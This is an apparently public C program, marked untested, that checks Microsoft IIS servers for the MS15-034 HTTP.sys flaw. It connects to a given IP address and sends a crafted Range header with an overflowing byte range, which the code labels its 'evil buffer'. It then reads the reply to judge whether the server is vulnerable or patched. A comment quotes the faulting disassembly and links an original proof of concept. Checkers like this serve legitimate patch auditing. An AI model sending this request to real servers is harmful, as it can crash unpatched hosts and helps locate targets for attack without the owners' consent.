/*
 UNTESTED - MS15-034 Checker
  
 THE BUG:

	8a8b2112 56              push    esi
	8a8b2113 6a00            push    0
	8a8b2115 2bc7            sub     eax,edi
	8a8b2117 6a01            push    1
	8a8b2119 1bca            sbb     ecx,edx
	8a8b211b 51              push    ecx
	8a8b211c 50              push    eax
	8a8b211d e8bf69fbff      call    HTTP!RtlULongLongAdd (8a868ae1) ; here

	ORIGNAL POC: http://pastebin.com/raw.php?i=ypURDPc4

	BY: john.b.hale@gmai.com
	Twitter: @rhcp011235
*/

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>

int connect_to_server(char *ip)
{
	int sockfd = 0, n = 0;

	struct sockaddr_in serv_addr;
	struct hostent *server;
    WSADATA wsaData;

    if(WSAStartup (0x0202, &wsaData))
    {
  	    perror("startup");
  	    exit(1);
  	}

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    	{
        	printf("\n Error : Could not create socket \n");
        	return 1;
    	}

	memset(&serv_addr, '0', sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(80);
	if(inet_pton(AF_INET, ip, &serv_addr.sin_addr)<=0)
    	{
        	printf("\n inet_pton error occured\n");
        	return 1;
    	}
	if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    	{
       		printf("\n Error : Connect Failed \n");
      		return 1;
    	} 

	return sockfd;
}
	

int main(int argc, char *argv[])
{
    int n = 0;
    int sockfd;
    char recvBuff[1024];

    // Check server
    char request[] = "GET / HTTP/1.0\r\n\r\n";

    // our evil buffer
    char request1[] = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n";


    if(argc != 2)
    {
        printf("\n Usage: %s <ip of server> \n",argv[0]);
        return 1;
    } 

    printf("[*] Audit Started\n");
    sockfd = connect_to_server(argv[1]);
    write(sockfd, request, strlen(request)); 
    int bytes_read = read(sockfd, recvBuff, sizeof(recvBuff)-1);

    if (!strstr(recvBuff,"Microsoft"))
    {
        printf("%d\n", bytes_read);
		printf("[*] NOT IIS\n");
		getchar();
		exit(1);
    }

    sockfd = connect_to_server(argv[1]);
    write(sockfd, request1, strlen(request1));
    read(sockfd, recvBuff, sizeof(recvBuff)-1);
    if (strstr(recvBuff,"Requested Range Not Satisfiable"))
    {
                printf("[!!] Looks VULN\n");
                exit(1);
    } else if(strstr(recvBuff,"The request has an invalid header name")) {
	    printf("[*] Looks Patched");
    } else
	    printf("[*] Unexpected response, cannot discern patch status");

    return 0;
}
